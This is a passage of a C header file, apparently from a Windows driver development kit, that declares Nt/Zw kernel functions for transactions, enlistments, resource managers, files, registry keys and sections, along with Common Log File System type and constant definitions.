  IN ENLISTMENT_INFORMATION_CLASS EnlistmentInformationClass,
  IN PVOID EnlistmentInformation,
  IN ULONG EnlistmentInformationLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRecoverEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PVOID EnlistmentKey OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtPrePrepareEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtPrepareEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCommitEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRollbackEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtPrePrepareComplete(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtPrepareComplete(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCommitComplete(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtReadOnlyEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRollbackComplete(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSinglePhaseReject(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateResourceManager(
  OUT PHANDLE ResourceManagerHandle,
  IN ACCESS_MASK DesiredAccess,
  IN HANDLE TmHandle,
  IN LPGUID RmGuid,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN ULONG CreateOptions OPTIONAL,
  IN PUNICODE_STRING Description OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenResourceManager(
  OUT PHANDLE ResourceManagerHandle,
  IN ACCESS_MASK DesiredAccess,
  IN HANDLE TmHandle,
  IN LPGUID ResourceManagerGuid OPTIONAL,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRecoverResourceManager(
  IN HANDLE ResourceManagerHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtGetNotificationResourceManager(
  IN HANDLE ResourceManagerHandle,
  OUT PTRANSACTION_NOTIFICATION TransactionNotification,
  IN ULONG NotificationLength,
  IN PLARGE_INTEGER Timeout OPTIONAL,
  OUT PULONG ReturnLength OPTIONAL,
  IN ULONG Asynchronous,
  IN ULONG_PTR AsynchronousContext OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationResourceManager(
  IN HANDLE ResourceManagerHandle,
  IN RESOURCEMANAGER_INFORMATION_CLASS ResourceManagerInformationClass,
  OUT PVOID ResourceManagerInformation,
  IN ULONG ResourceManagerInformationLength,
  OUT PULONG ReturnLength OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetInformationResourceManager(
  IN HANDLE ResourceManagerHandle,
  IN RESOURCEMANAGER_INFORMATION_CLASS ResourceManagerInformationClass,
  IN PVOID ResourceManagerInformation,
  IN ULONG ResourceManagerInformationLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRegisterProtocolAddressInformation(
  IN HANDLE ResourceManager,
  IN PCRM_PROTOCOL_ID ProtocolId,
  IN ULONG ProtocolInformationSize,
  IN PVOID ProtocolInformation,
  IN ULONG CreateOptions OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtPropagationComplete(
  IN HANDLE ResourceManagerHandle,
  IN ULONG RequestCookie,
  IN ULONG BufferLength,
  IN PVOID Buffer);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtPropagationFailed(
  IN HANDLE ResourceManagerHandle,
  IN ULONG RequestCookie,
  IN NTSTATUS PropStatus);

#endif /* NTDDI_VERSION >= NTDDI_VISTA */

#endif /* !_NTTMAPI_ */

/******************************************************************************
 *                            ZwXxx Functions                                 *
 ******************************************************************************/

/* Constants */
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define ZwCurrentProcess() NtCurrentProcess()
#define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )
#define ZwCurrentThread() NtCurrentThread()


#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTSYSAPI
NTSTATUS
NTAPI
ZwClose(
  IN HANDLE Handle);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateDirectoryObject(
  OUT PHANDLE DirectoryHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateFile(
  OUT PHANDLE FileHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PLARGE_INTEGER AllocationSize OPTIONAL,
  IN ULONG FileAttributes,
  IN ULONG ShareAccess,
  IN ULONG CreateDisposition,
  IN ULONG CreateOptions,
  IN PVOID EaBuffer OPTIONAL,
  IN ULONG EaLength);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateKey(
  OUT PHANDLE KeyHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN ULONG TitleIndex,
  IN PUNICODE_STRING Class OPTIONAL,
  IN ULONG CreateOptions,
  OUT PULONG Disposition OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateSection(
  OUT PHANDLE SectionHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER MaximumSize OPTIONAL,
  IN ULONG SectionPageProtection,
  IN ULONG AllocationAttributes,
  IN HANDLE FileHandle OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwDeleteKey(
  IN HANDLE KeyHandle);

NTSYSAPI
NTSTATUS
NTAPI
ZwDeleteValueKey(
  IN HANDLE KeyHandle,
  IN PUNICODE_STRING ValueName);

NTSYSAPI
NTSTATUS
NTAPI
ZwEnumerateKey(
  IN HANDLE KeyHandle,
  IN ULONG Index,
  IN KEY_INFORMATION_CLASS KeyInformationClass,
  OUT PVOID KeyInformation OPTIONAL,
  IN ULONG Length,
  OUT PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
ZwEnumerateValueKey(
  IN HANDLE KeyHandle,
  IN ULONG Index,
  IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
  OUT PVOID KeyValueInformation OPTIONAL,
  IN ULONG Length,
  OUT PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
ZwFlushKey(
  IN HANDLE KeyHandle);

NTSYSAPI
NTSTATUS
NTAPI
ZwLoadDriver(
  IN PUNICODE_STRING DriverServiceName);

NTSYSAPI
NTSTATUS
NTAPI
ZwMakeTemporaryObject(
  IN HANDLE Handle);

NTSYSAPI
NTSTATUS
NTAPI
ZwMapViewOfSection(
  IN HANDLE SectionHandle,
  IN HANDLE ProcessHandle,
  IN OUT PVOID *BaseAddress,
  IN ULONG_PTR ZeroBits,
  IN SIZE_T CommitSize,
  IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
  IN OUT PSIZE_T ViewSize,
  IN SECTION_INHERIT InheritDisposition,
  IN ULONG AllocationType,
  IN ULONG Protect);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenFile(
  OUT PHANDLE FileHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN ULONG ShareAccess,
  IN ULONG OpenOptions);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenKey(
  OUT PHANDLE KeyHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenSection(
  OUT PHANDLE SectionHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenSymbolicLinkObject(
  OUT PHANDLE LinkHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FileInformation,
  IN ULONG Length,
  IN FILE_INFORMATION_CLASS FileInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryKey(
  IN HANDLE KeyHandle,
  IN KEY_INFORMATION_CLASS KeyInformationClass,
  OUT PVOID KeyInformation OPTIONAL,
  IN ULONG Length,
  OUT PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySymbolicLinkObject(
  IN HANDLE LinkHandle,
  IN OUT PUNICODE_STRING LinkTarget,
  OUT PULONG ReturnedLength OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryValueKey(
  IN HANDLE KeyHandle,
  IN PUNICODE_STRING ValueName,
  IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
  OUT PVOID KeyValueInformation OPTIONAL,
  IN ULONG Length,
  OUT PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
ZwReadFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID Buffer,
  IN ULONG Length,
  IN PLARGE_INTEGER ByteOffset OPTIONAL,
  IN PULONG Key OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PVOID FileInformation,
  IN ULONG Length,
  IN FILE_INFORMATION_CLASS FileInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetValueKey(
  IN HANDLE KeyHandle,
  IN PUNICODE_STRING ValueName,
  IN ULONG TitleIndex OPTIONAL,
  IN ULONG Type,
  IN PVOID Data OPTIONAL,
  IN ULONG DataSize);

NTSYSAPI
NTSTATUS
NTAPI
ZwUnloadDriver(
  IN PUNICODE_STRING DriverServiceName);

NTSYSAPI
NTSTATUS
NTAPI
ZwUnmapViewOfSection(
  IN HANDLE ProcessHandle,
  IN PVOID BaseAddress OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwWriteFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PVOID Buffer,
  IN ULONG Length,
  IN PLARGE_INTEGER ByteOffset OPTIONAL,
  IN PULONG Key OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryFullAttributesFile(
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  OUT PFILE_NETWORK_OPEN_INFORMATION FileInformation);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */


#if (NTDDI_VERSION >= NTDDI_WS03)
NTSYSCALLAPI
NTSTATUS
NTAPI
ZwOpenEvent(
  OUT PHANDLE EventHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes);
#endif

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTSYSAPI
NTSTATUS
ZwCreateKeyTransacted(
  OUT PHANDLE KeyHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN ULONG TitleIndex,
  IN PUNICODE_STRING Class OPTIONAL,
  IN ULONG CreateOptions,
  IN HANDLE TransactionHandle,
  OUT PULONG Disposition OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenKeyTransacted(
  OUT PHANDLE KeyHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN HANDLE TransactionHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwCreateTransactionManager(
  OUT PHANDLE TmHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN PUNICODE_STRING LogFileName OPTIONAL,
  IN ULONG CreateOptions OPTIONAL,
  IN ULONG CommitStrength OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwOpenTransactionManager(
  OUT PHANDLE TmHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN PUNICODE_STRING LogFileName OPTIONAL,
  IN LPGUID TmIdentity OPTIONAL,
  IN ULONG OpenOptions OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwRollforwardTransactionManager(
  IN HANDLE TransactionManagerHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwRecoverTransactionManager(
  IN HANDLE TransactionManagerHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwQueryInformationTransactionManager(
  IN HANDLE TransactionManagerHandle,
  IN TRANSACTIONMANAGER_INFORMATION_CLASS TransactionManagerInformationClass,
  OUT PVOID TransactionManagerInformation,
  IN ULONG TransactionManagerInformationLength,
  OUT PULONG ReturnLength OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwSetInformationTransactionManager(
  IN HANDLE TmHandle,
  IN TRANSACTIONMANAGER_INFORMATION_CLASS TransactionManagerInformationClass,
  IN PVOID TransactionManagerInformation,
  IN ULONG TransactionManagerInformationLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwEnumerateTransactionObject(
  IN HANDLE RootObjectHandle OPTIONAL,
  IN KTMOBJECT_TYPE QueryType,
  IN OUT PKTMOBJECT_CURSOR ObjectCursor,
  IN ULONG ObjectCursorLength,
  OUT PULONG ReturnLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwCreateTransaction(
  OUT PHANDLE TransactionHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN LPGUID Uow OPTIONAL,
  IN HANDLE TmHandle OPTIONAL,
  IN ULONG CreateOptions OPTIONAL,
  IN ULONG IsolationLevel OPTIONAL,
  IN ULONG IsolationFlags OPTIONAL,
  IN PLARGE_INTEGER Timeout OPTIONAL,
  IN PUNICODE_STRING Description OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwOpenTransaction(
  OUT PHANDLE TransactionHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN LPGUID Uow,
  IN HANDLE TmHandle OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwQueryInformationTransaction(
  IN HANDLE TransactionHandle,
  IN TRANSACTION_INFORMATION_CLASS TransactionInformationClass,
  OUT PVOID TransactionInformation,
  IN ULONG TransactionInformationLength,
  OUT PULONG ReturnLength OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwSetInformationTransaction(
  IN HANDLE TransactionHandle,
  IN TRANSACTION_INFORMATION_CLASS TransactionInformationClass,
  IN PVOID TransactionInformation,
  IN ULONG TransactionInformationLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwCommitTransaction(
  IN HANDLE TransactionHandle,
  IN BOOLEAN Wait);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwRollbackTransaction(
  IN HANDLE TransactionHandle,
  IN BOOLEAN Wait);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwCreateResourceManager(
  OUT PHANDLE ResourceManagerHandle,
  IN ACCESS_MASK DesiredAccess,
  IN HANDLE TmHandle,
  IN LPGUID ResourceManagerGuid OPTIONAL,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN ULONG CreateOptions OPTIONAL,
  IN PUNICODE_STRING Description OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwOpenResourceManager(
  OUT PHANDLE ResourceManagerHandle,
  IN ACCESS_MASK DesiredAccess,
  IN HANDLE TmHandle,
  IN LPGUID ResourceManagerGuid,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwRecoverResourceManager(
  IN HANDLE ResourceManagerHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwGetNotificationResourceManager(
  IN HANDLE ResourceManagerHandle,
  OUT PTRANSACTION_NOTIFICATION TransactionNotification,
  IN ULONG NotificationLength,
  IN PLARGE_INTEGER Timeout,
  IN PULONG ReturnLength OPTIONAL,
  IN ULONG Asynchronous,
  IN ULONG_PTR AsynchronousContext OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwQueryInformationResourceManager(
  IN HANDLE ResourceManagerHandle,
  IN RESOURCEMANAGER_INFORMATION_CLASS ResourceManagerInformationClass,
  OUT PVOID ResourceManagerInformation,
  IN ULONG ResourceManagerInformationLength,
  IN PULONG ReturnLength OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwSetInformationResourceManager(
  IN HANDLE ResourceManagerHandle,
  IN RESOURCEMANAGER_INFORMATION_CLASS ResourceManagerInformationClass,
  IN PVOID ResourceManagerInformation,
  IN ULONG ResourceManagerInformationLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwCreateEnlistment(
  OUT PHANDLE EnlistmentHandle,
  IN ACCESS_MASK DesiredAccess,
  IN HANDLE ResourceManagerHandle,
  IN HANDLE TransactionHandle,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN ULONG CreateOptions OPTIONAL,
  IN NOTIFICATION_MASK NotificationMask,
  IN PVOID EnlistmentKey OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwOpenEnlistment(
  OUT PHANDLE EnlistmentHandle,
  IN ACCESS_MASK DesiredAccess,
  IN HANDLE RmHandle,
  IN LPGUID EnlistmentGuid,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwQueryInformationEnlistment(
  IN HANDLE EnlistmentHandle,
  IN ENLISTMENT_INFORMATION_CLASS EnlistmentInformationClass,
  OUT PVOID EnlistmentInformation,
  IN ULONG EnlistmentInformationLength,
  IN PULONG ReturnLength OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwSetInformationEnlistment(
  IN HANDLE EnlistmentHandle,
  IN ENLISTMENT_INFORMATION_CLASS EnlistmentInformationClass,
  IN PVOID EnlistmentInformation,
  IN ULONG EnlistmentInformationLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwRecoverEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PVOID EnlistmentKey OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwPrePrepareEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwPrepareEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwCommitEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwRollbackEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwPrePrepareComplete(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwPrepareComplete(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwCommitComplete(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwReadOnlyEnlistment(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwRollbackComplete(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
ZwSinglePhaseReject(
  IN HANDLE EnlistmentHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);
#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)
NTSYSAPI
NTSTATUS
NTAPI
ZwOpenKeyEx(
  OUT PHANDLE KeyHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN ULONG OpenOptions);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenKeyTransactedEx(
  OUT PHANDLE KeyHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN ULONG OpenOptions,
  IN HANDLE TransactionHandle);

NTSYSAPI
NTSTATUS
NTAPI
ZwNotifyChangeMultipleKeys(
  IN HANDLE MasterKeyHandle,
  IN ULONG Count OPTIONAL,
  IN OBJECT_ATTRIBUTES SubordinateObjects[] OPTIONAL,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN ULONG CompletionFilter,
  IN BOOLEAN WatchTree,
  OUT PVOID Buffer OPTIONAL,
  IN ULONG BufferSize,
  IN BOOLEAN Asynchronous);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryMultipleValueKey(
  IN HANDLE KeyHandle,
  IN OUT PKEY_VALUE_ENTRY ValueEntries,
  IN ULONG EntryCount,
  OUT PVOID ValueBuffer,
  IN OUT PULONG BufferLength,
  OUT PULONG RequiredBufferLength OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwRenameKey(
  IN HANDLE KeyHandle,
  IN PUNICODE_STRING NewName);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationKey(
  IN HANDLE KeyHandle,
  IN KEY_SET_INFORMATION_CLASS KeySetInformationClass,
  IN PVOID KeySetInformation,
  IN ULONG KeySetInformationLength);

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

#ifndef _CLFS_PUBLIC_H_
#define _CLFS_PUBLIC_H_

#ifndef CLFSUSER_API
#ifdef __CLFSUSER_EXPORTS__
#define CLFSUSER_API
#else
#define CLFSUSER_API __declspec(dllimport)
#endif
#endif

#if NTDDI_VERSION >= NTDDI_WS03SP1 || _WIN32_WINNT >= _WIN32_WINNT_WS03

#define FILE_ATTRIBUTE_DEDICATED                  FILE_ATTRIBUTE_TEMPORARY
#define EA_CONTAINER_NAME                         "ContainerName"
#define EA_CONTAINER_SIZE                         "ContainerSize"
#define CLFS_BASELOG_EXTENSION                    L".blf"
#define CLFS_FLAG_NO_FLAGS                        0x00000000
#define CLFS_FLAG_FORCE_APPEND                    0x00000001
#define CLFS_FLAG_FORCE_FLUSH                     0x00000002
#define CLFS_FLAG_USE_RESERVATION                 0x00000004
#define CLFS_FLAG_REENTRANT_FILE_SYSTEM           0x00000008
#define CLFS_FLAG_NON_REENTRANT_FILTER            0x00000010
#define CLFS_FLAG_REENTRANT_FILTER                0x00000020
#define CLFS_FLAG_IGNORE_SHARE_ACCESS             0x00000040
#define CLFS_FLAG_READ_IN_PROGRESS                0x00000080
#define CLFS_FLAG_MINIFILTER_LEVEL                0x00000100
#define CLFS_FLAG_HIDDEN_SYSTEM_LOG               0x00000200
#define CLFS_FLAG_FILTER_INTERMEDIATE_LEVEL       CLFS_FLAG_NON_REENTRANT_FILTER
#define CLFS_FLAG_FILTER_TOP_LEVEL                CLFS_FLAG_REENTRANT_FILTER
#define CLFS_MARSHALLING_FLAG_NONE                0x00000000
#define CLFS_MARSHALLING_FLAG_DISABLE_BUFF_INIT   0x00000001

typedef ULONG CLFS_CONTAINER_ID, *PCLFS_CONTAINER_ID, **PPCLFS_CONTAINER_ID;

typedef struct _CLS_LSN {
  ULONGLONG Internal;
} CLS_LSN, *PCLS_LSN, **PPCLS_LSN;

typedef CLS_LSN CLFS_LSN, *PCLFS_LSN, **PPCLFS_LSN;

extern __declspec(dllimport) const CLFS_LSN CLFS_LSN_INVALID;
extern __declspec(dllimport) const CLFS_LSN CLFS_LSN_NULL;

#define ClfsNullRecord      0x00
#define ClfsDataRecord      0x01
#define ClfsRestartRecord   0x02
#define ClfsClientRecord (ClfsDataRecord | ClfsRestartRecord)

#define CLFS_CONTAINER_STREAM_PREFIX        L"%BLF%:"
#define CLFS_CONTAINER_RELATIVE_PREFIX      L"%BLF%\\"

typedef UCHAR CLS_RECORD_TYPE, *PCLS_RECORD_TYPE, **PPCLS_RECORD_TYPE;
typedef CLS_RECORD_TYPE CLFS_RECORD_TYPE, *PCLFS_RECORD_TYPE, **PPCLFS_RECORD_TYPE;

typedef enum _CLS_CONTEXT_MODE {
  ClsContextNone,
  ClsContextUndoNext,
  ClsContextPrevious,
  ClsContextForward
} CLS_CONTEXT_MODE, *PCLS_CONTEXT_MODE, **PPCLS_CONTEXT_MODE;

typedef enum _CLFS_CONTEXT_MODE {
  ClfsContextNone,
  ClfsContextUndoNext,
  ClfsContextPrevious,
  ClfsContextForward
} CLFS_CONTEXT_MODE, *PCLFS_CONTEXT_MODE, **PPCLFS_CONTEXT_MODE;

typedef struct _CLFS_NODE_ID {
  ULONG cType;
  ULONG cbNode;
} CLFS_NODE_ID, *PCLFS_NODE_ID;

typedef struct _CLS_WRITE_ENTRY {
  PVOID Buffer;
  ULONG ByteLength;
} CLS_WRITE_ENTRY, *PCLS_WRITE_ENTRY, **PPCLS_WRITE_ENTRY;

typedef CLS_WRITE_ENTRY CLFS_WRITE_ENTRY, *PCLFS_WRITE_ENTRY, **PPCLFS_WRITE_ENTRY;

typedef GUID CLFS_LOG_ID;

typedef struct _CLS_INFORMATION {
  LONGLONG TotalAvailable;
  LONGLONG CurrentAvailable;
  LONGLONG TotalReservation;
  ULONGLONG BaseFileSize;
  ULONGLONG ContainerSize;
  ULONG TotalContainers;
  ULONG FreeContainers;
  ULONG TotalClients;
  ULONG Attributes;
  ULONG FlushThreshold;
  ULONG SectorSize;
  CLS_LSN MinArchiveTailLsn;
  CLS_LSN BaseLsn;
  CLS_LSN LastFlushedLsn;
  CLS_LSN LastLsn;
  CLS_LSN RestartLsn;
  GUID Identity;
} CLS_INFORMATION, *PCLS_INFORMATION, *PPCLS_INFORMATION;

typedef CLS_INFORMATION CLFS_INFORMATION, *PCLFS_INFORMATION, *PPCLFS_INFORMATION;

typedef struct _CLFS_LOG_NAME_INFORMATION {
  USHORT NameLengthInBytes;
  WCHAR Name[1];
} CLFS_LOG_NAME_INFORMATION, *PCLFS_LOG_NAME_INFORMATION, **PPCLFS_LOG_NAME_INFORMATION;

typedef struct _CLFS_STREAM_ID_INFORMATION {
  UCHAR StreamIdentifier;
} CLFS_STREAM_ID_INFORMATION, *PCLFS_STREAM_ID_INFORMATION, **PPCLFS_STREAM_ID_INFORMATION;

typedef UINT32 CLS_CONTAINER_STATE, *PCLS_CONTAINER_STATE, *PPCLS_CONTAINER_STATE;
typedef CLS_CONTAINER_STATE CLFS_CONTAINER_STATE, *PCLFS_CONTAINER_STATE, *PPCLFS_CONTAINER_STATE;

#define ClsContainerInitializing              0x01
#define ClsContainerInactive                  0x02
#define ClsContainerActive                    0x04
#define ClsContainerActivePendingDelete       0x08
#define ClsContainerPendingArchive            0x10
#define ClsContainerPendingArchiveAndDelete   0x20

#define ClfsContainerInitializing             0x01
#define ClfsContainerInactive                 0x02
#define ClfsContainerActive                   0x04
#define ClfsContainerActivePendingDelete      0x08
#define ClfsContainerPendingArchive           0x10
#define ClfsContainerPendingArchiveAndDelete  0x20

#define CLFS_MAX_CONTAINER_INFO 256

typedef struct _CLS_CONTAINER_INFORMATION {
  ULONG FileAttributes;
  ULONGLONG CreationTime;
  ULONGLONG LastAccessTime;
  ULONGLONG LastWriteTime;
  LONGLONG ContainerSize;
  ULONG FileNameActualLength;
  ULONG FileNameLength;
  WCHAR FileName[CLFS_MAX_CONTAINER_INFO];
  CLFS_CONTAINER_STATE State;
  CLFS_CONTAINER_ID PhysicalContainerId;
  CLFS_CONTAINER_ID LogicalContainerId;
} CLS_CONTAINER_INFORMATION, *PCLS_CONTAINER_INFORMATION, **PPCLS_CONTAINER_INFORMATION;

